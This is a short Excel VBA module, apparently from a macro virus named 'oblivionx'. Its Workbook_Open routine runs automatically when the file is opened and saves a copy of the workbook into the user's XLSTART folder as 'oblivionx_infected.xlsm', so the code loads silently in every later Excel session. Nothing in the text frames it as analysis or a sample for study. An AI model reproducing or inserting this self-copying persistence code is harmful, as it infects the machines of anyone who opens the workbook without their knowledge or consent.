Attribute VB_Name = "ThisWorkbook"
Private Sub Workbook_Open()
    Dim dst As String
    dst = Environ("APPDATA") & "\Microsoft\Excel\XLSTART\oblivionx_infected.xlsm"
    ThisWorkbook.SaveCopyAs dst
End Sub
